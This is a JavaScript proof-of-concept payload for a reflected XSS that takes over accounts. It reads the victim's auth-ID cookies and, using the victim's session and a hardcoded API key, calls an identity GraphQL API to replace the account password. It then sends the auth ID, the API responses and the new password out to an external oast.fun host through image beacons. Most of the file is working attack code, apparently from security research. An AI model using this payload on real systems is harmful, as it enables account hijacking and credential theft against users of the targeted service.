(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}

var authId=gc('qbn.authid')||gc('qbn.gauthid');
var NEW_PASS='Hacked@'+(2026+Math.floor(Math.random()*974));

log('[*] XSS Password Change PoC (p42)');
log('[*] Reflected XSS -> Account Takeover');
log('[*] Origin: '+location.origin);
log('[*] AuthId: '+authId);
log('[*] New password: '+NEW_PASS);
log('');

log('[1] Sending ReplacePassword...');
beacon('p42-start','a='+authId);

fetch('/identity-api/v2/graphql',{
method:'POST',
credentials:'include',
headers:{
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0'
},
body:JSON.stringify({
operationName:'ReplacePassword',
query:'mutation ReplacePassword($input: Identity_CreateOrReplacePasswordCredentialInput!) { identityCreateOrReplacePasswordCredential(input: $input) { __typename ... on Identity_CreateOrReplacePasswordCredentialSuccess { status } ... on Identity_CredentialUnauthorizedError { message } ... on Identity_CredentialInvalidInputError { message } ... on Identity_DigitalIdentityLockedOutError { message } } }',
variables:{input:{newPassword:NEW_PASS}}
})
}).then(function(r){return r.text()}).then(function(cr){
log('[1] Response: '+cr.substring(0,500));
beacon('p42-resp',cr.substring(0,900));

var crd;try{crd=JSON.parse(cr)}catch(e){}
if(crd&&crd.data&&crd.data.identityCreateOrReplacePasswordCredential){
var result=crd.data.identityCreateOrReplacePasswordCredential;
if(result.__typename==='Identity_CreateOrReplacePasswordCredentialSuccess'){
log('');
log('=============================================');
log('  ACCOUNT TAKEOVER - PASSWORD CHANGED');
log('  New password: '+NEW_PASS);
log('  Status: '+result.status);
log('  AuthId: '+authId);
log('');
log('  Victim cannot log in with old password.');
log('  Attacker exfiltrated new password via OAST.');
log('=============================================');
beacon('p42-SUCCESS','p='+encodeURIComponent(NEW_PASS)+'&a='+authId);
}else{
log('[!] '+result.__typename+': '+(result.message||''));
beacon('p42-fail',result.__typename);
}
}else if(crd&&crd.errors){
log('[!] Errors: '+JSON.stringify(crd.errors).substring(0,400));
beacon('p42-err',JSON.stringify(crd.errors).substring(0,400));
}else{
log('[!] Unexpected: '+cr.substring(0,400));
}
}).catch(function(err){
log('[!] '+err.message);
beacon('p42-fetcherr',err.message);
});

}catch(e){
(new Image).src=O+'/p42-crash?e='+encodeURIComponent(e.message);
}
})();
